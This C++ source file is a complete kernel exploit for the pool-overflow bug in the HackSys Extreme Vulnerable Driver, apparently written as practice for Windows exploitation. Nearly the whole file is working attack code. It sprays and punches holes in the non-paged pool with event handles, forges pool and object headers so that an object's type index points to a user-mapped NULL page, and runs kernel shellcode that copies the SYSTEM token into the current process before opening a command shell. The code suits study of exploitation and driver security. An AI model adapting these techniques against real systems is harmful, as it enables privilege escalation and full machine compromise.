#include <vector>
#include <iostream>
#include <Windows.h>
#include <Psapi.h>
#pragma warning(disable : 6387)

using NTSTATUS = _Return_type_success_(return >= 0) LONG;
using pNtAllocateVirtualMemory = __kernel_entry NTSYSCALLAPI NTSTATUS(NTAPI*) (
	_In_ HANDLE, _Inout_ PVOID*, _In_ ULONG_PTR, _Inout_ PSIZE_T, _In_ ULONG, _In_ ULONG);

using PKTHREAD = PVOID;
using DBGPRINT = ULONG(NTAPI*)(PCSTR, ...);
using KEGETCURRENTTHREAD = PKTHREAD(NTAPI*)();
using PSGETCURRENTPROCESSID = HANDLE(NTAPI*)();
using PSINITIALSYSTEMPROCESS = PVOID(NTAPI*)();

#define HACKSYS_EVD_IOCTL_POOL_OVERFLOW     CTL_CODE(FILE_DEVICE_UNKNOWN, 0x803, METHOD_NEITHER, FILE_ANY_ACCESS)
#define HACKSYS_EVD_DEVICE_NAME				L"\\\\.\\HackSysExtremeVulnerableDriver"
#define HACKSYS_EVD_POOL_SIZE					0x1F8
#define HACKSYS_EVD_POOL_HEADER_OFFSET			HACKSYS_EVD_POOL_SIZE + 0x8
#define HACKSYS_EVD_POOL_OBJECT_HEADER_OFFSET	HACKSYS_EVD_POOL_HEADER_OFFSET + 0x10
#define HACKSYS_EVD_TOTAL_POOL_SIZE				HACKSYS_EVD_POOL_OBJECT_HEADER_OFFSET + 0x10
#define HACKSYS_EVD_POOL_HANDLE_SIZE			0x2710

//0x8 bytes (sizeof)
struct _POOL_HEADER
{
	union
	{
		struct
		{
			USHORT PreviousSize : 9;                                          //0x0
			USHORT PoolIndex : 7;                                             //0x0
			USHORT BlockSize : 9;                                             //0x2
			USHORT PoolType : 7;                                              //0x2
		};
		ULONG Ulong1;                                                       //0x0
	};
	union
	{
		ULONG PoolTag;                                                      //0x4
		struct
		{
			USHORT AllocatorBackTraceIndex;                                 //0x4
			USHORT PoolTagHash;                                             //0x6
		};
	};
};

//0x10 bytes (sizeof)
struct _OBJECT_HEADER_QUOTA_INFO {
	ULONG PagedPoolCharge;                                                  //0x0
	ULONG NonPagedPoolCharge;                                               //0x4
	ULONG SecurityDescriptorCharge;                                         //0x8
	VOID* SecurityDescriptorQuotaBlock;                                     //0xc
};

//0x4 bytes (sizeof)
struct _EX_PUSH_LOCK
{
	union
	{
		struct
		{
			ULONG Locked : 1;                                                 //0x0
			ULONG Waiting : 1;                                                //0x0
			ULONG Waking : 1;                                                 //0x0
			ULONG MultipleShared : 1;                                         //0x0
			ULONG Shared : 28;                                                //0x0
		};
		ULONG Value;                                                        //0x0
		VOID* Ptr;                                                          //0x0
	};
};

//0x8 bytes (sizeof)
struct _QUAD
{
	union
	{
		LONGLONG UseThisFieldToCopy;                                        //0x0
		double DoNotUseThisField;                                           //0x0
	};
};

//0x20 bytes (sizeof)
struct _OBJECT_HEADER
{
	LONG PointerCount;                                                      //0x0
	union
	{
		LONG HandleCount;                                                   //0x4
		VOID* NextToFree;                                                   //0x4
	};
	struct _EX_PUSH_LOCK Lock;                                              //0x8
	UCHAR TypeIndex;                                                        //0xc
	UCHAR TraceFlags;                                                       //0xd
	UCHAR InfoMask;                                                         //0xe
	UCHAR Flags;                                                            //0xf
};

DBGPRINT DbgPrint{};
KEGETCURRENTTHREAD KeGetCurrentThread{};
PSGETCURRENTPROCESSID PsGetCurrentProcessId{};
PSINITIALSYSTEMPROCESS PsInitialSystemProcess{};

static auto NtkrnlpaBase() -> LPVOID {
	LPVOID lpImageBase[1024];
	DWORD lpcbNeeded;
	TCHAR lpfileName[1024];

	EnumDeviceDrivers(lpImageBase, sizeof(lpImageBase), &lpcbNeeded);

	for (int i = 0; i < 1024; i++) {
		GetDeviceDriverBaseNameA(lpImageBase[i], (LPSTR)lpfileName, 48);

		if (!strcmp((LPSTR)lpfileName, "ntkrnlpa.exe")) {
			return lpImageBase[i];
		}
	}
	return NULL;
}

static auto ShellCode() -> void {

	auto systemEProcess = *(void**)PsInitialSystemProcess;

	//auto systemProcessToken = *(void**)((byte*)systemEProcess + 0xf8);

	auto currHandle = PsGetCurrentProcessId();

	auto currThread = KeGetCurrentThread();

	auto currProcess = *(void**)((byte*)currThread + 0x50);

	auto currProcessTokenOffset = ((byte*)currProcess + 0xf8);
	auto systemProcessTokenOffset = ((byte*)systemEProcess + 0xf8);
	*(void**)currProcessTokenOffset = *(void**)systemProcessTokenOffset;

	return;
}


class NonPagedPoolOverflow {
private:
	HANDLE hHandle;

	std::vector<HANDLE> hEventsA;
	std::vector<HANDLE> hEventsB;

	void* data;
	void* kernel_base;

public:
	NonPagedPoolOverflow() : hHandle{ getDeviceHandle() }, data{ nullptr }, kernel_base{ nullptr } {
		hEventsA.reserve(HACKSYS_EVD_POOL_HANDLE_SIZE);
		hEventsB.reserve(HACKSYS_EVD_POOL_HANDLE_SIZE);
	}

	~NonPagedPoolOverflow() {
		if (data)		std::free(data);
		if (hHandle)	::CloseHandle(hHandle);
	}

	auto createSizedHoles() -> void {
		for (auto idx = 0; idx < HACKSYS_EVD_POOL_HANDLE_SIZE; ++idx) {
			auto event = ::CreateEventA(nullptr, false, false, nullptr);
			if (event == INVALID_HANDLE_VALUE)	continue;
			hEventsA.push_back(event);
		}

		for (auto idx = 0; idx < HACKSYS_EVD_POOL_HANDLE_SIZE; ++idx) {
			auto event = ::CreateEventA(nullptr, false, false, nullptr);
			if (event == INVALID_HANDLE_VALUE)	continue;
			hEventsB.push_back(event);
		}

		for (auto i = 0; i < hEventsB.size(); i += 0x16) {
			for (auto j = 0; j < 8; j++)
				CloseHandle(hEventsB.at(i + j));
		}
	}

	auto free_chunks() -> void {
		for (auto idx = 0; idx < HACKSYS_EVD_POOL_HANDLE_SIZE; idx++) {
			if (hEventsA.at(idx) != nullptr)
				::CloseHandle(hEventsA.at(idx));
		}

		for (int idx = 0; idx < HACKSYS_EVD_POOL_HANDLE_SIZE; idx++) {
			if (hEventsB.at(idx) != nullptr)
				::CloseHandle(hEventsB.at(idx));
		}
	}

	auto interact() -> bool {
		doPrimitive();

		void* data = std::malloc(HACKSYS_EVD_TOTAL_POOL_SIZE);
		if (data == nullptr)	exit(-1);

		_POOL_HEADER pool_header{};
		pool_header.Ulong1 = 0x4080040;
		pool_header.PoolTag = 0xee657645;

		_OBJECT_HEADER_QUOTA_INFO objectQuotaInfo{};
		objectQuotaInfo.PagedPoolCharge = 0x0;
		objectQuotaInfo.NonPagedPoolCharge = 0x40;
		objectQuotaInfo.SecurityDescriptorCharge = 0x0;
		objectQuotaInfo.SecurityDescriptorQuotaBlock = nullptr;

		_OBJECT_HEADER object_header{};
		object_header.PointerCount = 0x1;
		object_header.HandleCount = 0x1;
		object_header.NextToFree = (void*)0x1;
		object_header.Lock.Value = 0x0;
		object_header.TypeIndex = 0x0;		// This references a NULL page
		object_header.TraceFlags = 0x0;
		object_header.InfoMask = 0x8;
		object_header.Flags = 0x0;

		std::memset(data, 0x41, HACKSYS_EVD_POOL_SIZE);
		*(_POOL_HEADER*)((byte*)data + HACKSYS_EVD_POOL_SIZE) = pool_header;
		*(_OBJECT_HEADER_QUOTA_INFO*)((byte*)data + HACKSYS_EVD_POOL_HEADER_OFFSET) = objectQuotaInfo;
		*(_OBJECT_HEADER*)((byte*)data + HACKSYS_EVD_POOL_OBJECT_HEADER_OFFSET) = object_header;

		DWORD nBytes = 0;
		auto ret = ::DeviceIoControl(hHandle, HACKSYS_EVD_IOCTL_POOL_OVERFLOW, data, HACKSYS_EVD_TOTAL_POOL_SIZE,
			nullptr, 0, &nBytes, nullptr);
		if (ret == false)	std::printf("DeviceIoControl failed with error code : %x\n", ::GetLastError());

		return ret;
	}

	auto ResolveNtAddress(PCSTR routineName) -> void* {
		if (!kernel_base)	return nullptr;

		HMODULE hUserSpaceBase = LoadLibraryA("ntkrnlpa.exe");
		if (hUserSpaceBase == nullptr)	return nullptr;

		void* pUserSpaceAddress = GetProcAddress(hUserSpaceBase, routineName);
		void* address = (void*)((std::uint32_t)kernel_base +
			((std::uint32_t)pUserSpaceAddress - (std::uint32_t)hUserSpaceBase));

		return address;
	}

	auto doPrimitive() -> void {
		/*
		* Resolve Kernel Addresses
		*/
		kernel_base = NtkrnlpaBase();

		PsInitialSystemProcess = reinterpret_cast<PSINITIALSYSTEMPROCESS>
			(ResolveNtAddress("PsInitialSystemProcess"));

		PsGetCurrentProcessId = reinterpret_cast<PSGETCURRENTPROCESSID>
			(ResolveNtAddress("PsGetCurrentProcessId"));

		KeGetCurrentThread = reinterpret_cast<KEGETCURRENTTHREAD>
			(ResolveNtAddress("KeGetCurrentThread"));

		DbgPrint = reinterpret_cast<DBGPRINT>(ResolveNtAddress("DbgPrint"));
	}

	auto allocateNULLPage() -> void {
		auto NtAllocateVirtualMemory = reinterpret_cast<pNtAllocateVirtualMemory>
			(GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtAllocateVirtualMemory"));
		if (!NtAllocateVirtualMemory) {
			std::cout << "[-] Failed to resolve base address for NtAllocateVirtualMemory\n";
			return;
		}

		void* base_address = (void*)0x1;
		size_t region_size = USN_PAGE_SIZE;

		NtAllocateVirtualMemory(GetCurrentProcess(), &base_address, 0,
			reinterpret_cast<PSIZE_T>(&region_size), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

		auto payload = &ShellCode;
		std::memcpy((void*)0x60, &payload, sizeof(void*));

		return;
	}

	auto getDeviceHandle() -> HANDLE {
		auto handle = ::CreateFile(HACKSYS_EVD_DEVICE_NAME, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE,
			nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
		if (handle == nullptr || handle == INVALID_HANDLE_VALUE)		exit(-1);

		return handle;
	}

	auto createCmdShell() -> void {
		STARTUPINFO si = { sizeof(si) };
		PROCESS_INFORMATION pi = { 0 };
		si.dwFlags = STARTF_USESHOWWINDOW;
		si.wShowWindow = SW_SHOW;
		WCHAR wzFilePath[MAX_PATH] = { L"cmd.exe" };
		BOOL bReturn = CreateProcessW(nullptr, wzFilePath, nullptr, nullptr, false, CREATE_NEW_CONSOLE,
			nullptr, nullptr, (LPSTARTUPINFOW)&si, &pi);

		if (bReturn) CloseHandle(pi.hThread), CloseHandle(pi.hProcess);
	}
};

auto main(int argc, char* argv[]) -> int {
	NonPagedPoolOverflow np{};

	np.allocateNULLPage();
	np.createSizedHoles();
	np.interact();
	np.free_chunks();
	np.createCmdShell();

	return 0;

}
